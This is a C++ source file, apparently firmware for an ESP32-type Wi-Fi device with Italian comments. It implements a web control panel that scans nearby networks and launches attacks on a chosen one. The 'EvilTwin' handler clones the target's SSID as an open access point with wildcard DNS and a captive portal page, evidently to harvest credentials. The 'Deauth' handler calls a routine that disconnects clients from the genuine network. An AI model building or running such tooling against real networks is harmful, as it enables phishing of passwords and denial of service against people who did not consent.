

#include <cstring>

#include <DNSServer.h>
#include <HTTP_Method.h>
#include <Uri.h>
#include <WebServer.h>

#include "network.h"

#include "apHtmlPages.h"

_Network networks[MAX_NETWORKS];


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer server(80);

void captivePortal(){

  server.send(200, "text/html", etCaptivePortalPage);

}


void indexPage(){

  //pagina html
  String page=apIndexPage;
  //passa l'indirizzo dell'array e lo riempie con i dati dei networks circostanti
  scanForNetworks(networks);


  for(int i=0; i<MAX_NETWORKS; i++){

    char index[5];
    itoa(i, index, 10);

    page+= "<tr><td>"+networks[i].ssid+"</td>";
    page+= "<td><form action='/step2' method='get'><input type='hidden' name='networkId' value='"+((String) index)+"'><input type='submit' name='ev' value='EvilTwin'></form></td>";
    page+= "<td><form action='/step2' method='get'><input type='hidden' name='networkId' value='"+((String) index)+"'><input type='submit' name='da' value='Deauth'></form></td></tr>";

  }

  page+="</table></body></html>";

  //invio la risposta
  server.send(200, "text/html", page);

}


void attack(){

  char buffer[60];
  int index;

  if(server.hasArg("networkId")){

    strncpy(buffer, server.arg("networkId").c_str(), sizeof(buffer));
    
    index = atoi(buffer);

    if(server.hasArg("ev")){

      // if(spoofMac(networks[index].bssid)){

      //   Serial.println("MAC Spoofing riuscito");

      // }
      // else{

      //   Serial.println("Errore durante lo spoofing del MAC");

      // }

      Serial.println("Starting Evil Twin on network");
      Serial.println(networks[index].ssid);

      WiFi.mode(WIFI_AP_STA);
      //                IP address                  gw IP address               subnetmask
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(networks[index].ssid, "", (int) networks[index].ch);

      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

      server.on("/", captivePortal);
      server.onNotFound(captivePortal);
      server.begin();

    }
    if(server.hasArg("da")){

      start_deauth(networks[index]);

    }

  }

}

void apInit(const char * apName, const char * apPasswd){

    WiFi.mode(WIFI_AP_STA);
    //                IP address                  gw IP address               subnetmask
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName, apPasswd);
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    server.on("/", indexPage);
    server.on("/step2", attack);
    server.onNotFound(indexPage);
    server.begin();

}

void apHandler(){

    dnsServer.processNextRequest();
    server.handleClient();

}